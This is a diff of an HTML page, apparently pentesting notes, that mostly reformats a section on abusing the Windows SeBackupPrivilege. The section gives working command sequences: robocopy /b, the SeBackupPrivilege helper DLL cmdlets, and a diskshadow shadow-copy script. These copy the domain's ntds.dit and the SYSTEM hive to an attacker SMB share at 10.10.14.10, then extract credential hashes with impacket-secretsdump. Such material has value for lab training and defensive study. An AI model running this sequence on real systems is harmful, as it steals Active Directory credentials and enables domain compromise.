@@ -202,43 +202,60 @@
 
 <div class="content"><hr>
 <h3 id="abuse-1-robocopy">Abuse #1: Robocopy</h3>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># For example</span>
 </span></span><span class="line"><span class="cl"><span class="n">robocopy</span> <span class="p">/</span><span class="n">b</span> <span class="p">&lt;</span><span class="n">TARGET_DIR_PATH</span><span class="p">&gt;</span> <span class="n">C:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">Tasks</span> <span class="p">&lt;</span><span class="n">TARGET_FILE</span><span class="p">&gt;</span>
-</span></span></code></pre></div><br>
+</span></span></code></pre></div></div>
+<br>
 <hr>
 <h3 id="abuse-2-using-helper-dlls">Abuse #2: Using helper dlls</h3>
-<p><a href="https://github.com/giuliano108/SeBackupPrivilege/blob/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeUtils.dll?raw=true">SeBackupPrivilegeUtils.dll</a></p>
-<p><a href="https://github.com/giuliano108/SeBackupPrivilege/blob/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeCmdLets.dll?raw=true">SeBackupPrivilegeCmdLets.dll</a></p>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">import-module</span> <span class="p">.\</span><span class="n">SeBackupPrivilegeCmdLets</span><span class="p">.</span><span class="py">dll</span>
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">import-module</span> <span class="p">.\</span><span class="n">SeBackupPrivilegeUtils</span><span class="p">.</span><span class="py">dll</span>
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Copy-FileSeBackupPrivilege</span> <span class="p">&lt;</span><span class="n">TARGET_FILE_PATH</span><span class="p">&gt;</span> <span class="n">C:</span><span class="p">\</span><span class="n">ProgramData</span><span class="p">\&lt;</span><span class="n">TARGET_FILE</span><span class="p">&gt;</span>
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># For example</span>
 </span></span><span class="line"><span class="cl"><span class="nb">Copy-FileSeBackupPrivilege</span> <span class="n">C:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">ntds</span><span class="p">\</span><span class="n">ntds</span><span class="p">.</span><span class="py">dit</span> <span class="n">C:</span><span class="p">\</span><span class="n">ProgramData</span><span class="p">\</span><span class="n">ntds</span><span class="p">.</span><span class="py">dit</span>
-</span></span></code></pre></div><br>
+</span></span></code></pre></div></div>
+<p><small><em>Ref: <a href="https://github.com/giuliano108/SeBackupPrivilege/blob/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeUtils.dll?raw=true">SeBackupPrivilegeUtils.dll</a></em></small>
+<br>
+<small><em>Ref: <a href="https://github.com/giuliano108/SeBackupPrivilege/blob/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeCmdLets.dll?raw=true">SeBackupPrivilegeCmdLets.dll</a></em></small></p>
+<br>
 <hr>
 <h3 id="abuse-3-diskshadow">Abuse #3: Diskshadow</h3>
 <h4 id="1-create-a-dsh-file">1. Create a .dsh file</h4>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">set</span> context persistent nowriters
 </span></span><span class="line"><span class="cl"><span class="nb">set</span> metadata C:<span class="se">\P</span>rogramData<span class="se">\t</span>est.cab
 </span></span><span class="line"><span class="cl"><span class="nb">set</span> verbose on
 </span></span><span class="line"><span class="cl">add volume c: <span class="nb">alias</span> <span class="nb">test</span>
 </span></span><span class="line"><span class="cl">create
 </span></span><span class="line"><span class="cl">expose %test% x:
-</span></span></code></pre></div><br>
+</span></span></code></pre></div></div>
+<br>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Convert to dos format</span>
 </span></span><span class="line"><span class="cl">unix2dos vss.dsh
-</span></span></code></pre></div><h4 id="2-run-vssdsh">2. Run vss.dsh</h4>
+</span></span></code></pre></div></div>
+<h4 id="2-run-vssdsh">2. Run vss.dsh</h4>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># Upload and run</span>
 </span></span><span class="line"><span class="cl"><span class="n">diskshadow</span> <span class="p">/</span><span class="n">s</span> <span class="n">C:</span><span class="p">\</span><span class="n">ProgramData</span><span class="p">\</span><span class="n">vss</span><span class="p">.</span><span class="py">dsh</span>
-</span></span></code></pre></div><h4 id="3-host-a-smb-server-in-linux">3. Host a smb server (In Linux)</h4>
+</span></span></code></pre></div></div>
+<h4 id="3-host-a-smb-server-in-linux">3. Host a smb server (In Linux)</h4>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">impacket-smbserver share . -smb2support
-</span></span></code></pre></div><h4 id="4-copy-to-local-linux">4. Copy to local Linux</h4>
+</span></span></code></pre></div></div>
+<h4 id="4-copy-to-local-linux">4. Copy to local Linux</h4>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">net use <span class="se">\\</span>10.10.14.10<span class="se">\s</span>hare
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">Copy-FileSeBackupPrivilege x:<span class="se">\W</span>indows<span class="se">\n</span>tds<span class="se">\n</span>tds.dit <span class="se">\\</span>10.10.14.10<span class="se">\s</span>hare<span class="se">\n</span>tds.dit
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">reg.exe save hklm<span class="se">\s</span>ystem <span class="se">\\</span>10.10.14.10<span class="se">\s</span>hare<span class="se">\s</span>ystem
-</span></span></code></pre></div><h4 id="5-secrets-dump">5. Secrets dump</h4>
+</span></span></code></pre></div></div>
+<h4 id="5-secrets-dump">5. Secrets dump</h4>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">impacket-secretsdump -ntds ntds.dit -system system LOCAL
-</span></span></code></pre></div><br></div></div>
+</span></span></code></pre></div></div>
+<br></div></div>
     
     <script src="/js/utils.js"></script>
     <footer>
